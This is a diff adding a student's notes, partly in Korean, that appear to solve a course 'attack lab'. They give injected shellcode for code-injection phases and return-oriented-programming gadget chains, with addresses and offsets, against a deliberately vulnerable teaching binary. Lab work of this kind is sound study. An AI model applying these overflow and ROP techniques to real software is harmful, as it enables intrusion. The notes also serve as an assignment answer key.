@@ -1,0 +1,51 @@
+00000000004018d6 <getbuf>:
+  4018d6:       48 83 ec 18             sub    $0x18,%rsp
+  4018da:       48 89 e7                mov    %rsp,%rdi
+  4018dd:       e8 7e 02 00 00          callq  401b60 <Gets>
+  4018e2:       b8 01 00 00 00          mov    $0x1,%eax
+  4018e7:       48 83 c4 18             add    $0x18,%rsp
+  4018eb:       c3                      retq
+
+00000000004018ec <touch1>:
+
+0x533f8d53  // cookie
+35 33 33 66 38 64 35 33 // cookie값 ascii로 표현
+
+0x556179b8  // buffer 할당 받은 후 %rsp
+
+0000000000401918 <touch2>:
+
+0000000000000000 <.text>:
+   0:	68 18 19 40 00       	pushq  $0x401918
+   5:	48 c7 c7 53 8d 3f 53 	mov    $0x533f8d53,%rdi
+   c:	c3                   	retq 
+
+0000000000401a29 <touch3>:
+
+0x556179D0  // buffer 할당 받은 후 %rsp에 0x18을 더한 return address의 첫 부분
+
+0000000000000000 <.text>:
+   0:	68 29 1a 40 00       	pushq  $0x401a29
+   5:	48 c7 c7 d8 79 61 55 	mov    $0x556179d8,%rdi
+   c:	c3                   	retq   
+
+<phase4>
+401ad9+3	// popq %rax
+401ac6+3	// movq %rax, %rdi
+
+<phase5>
+0000000000401b01 <add_xy>:
+  401b01:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
+  401b05:       c3                      retq
+
+401b0e	// movq %rsp, %rax	(48 89 e0)
+401ac9	// movq %rax, %rdi
+401adc	// popq %rax
+0x48		// offset(rax에 rsp를 담는 명령어로부터 쿠키문자열까지의 거리:9줄*8바이트)
+401b23	// movl %eax, %ecx	(89 c1)
+401b6c	// movl %ecx, %edx	(89 ca)
+401b94	// movl %edx, %esi 	(89 d6)
+401b01	// add_xy 호출
+401ac9	// movq %rax, %rdi
+401a29	// touch3 호출
+35 33 33 66 38 64 35 33 // cookie값 ascii로 표현
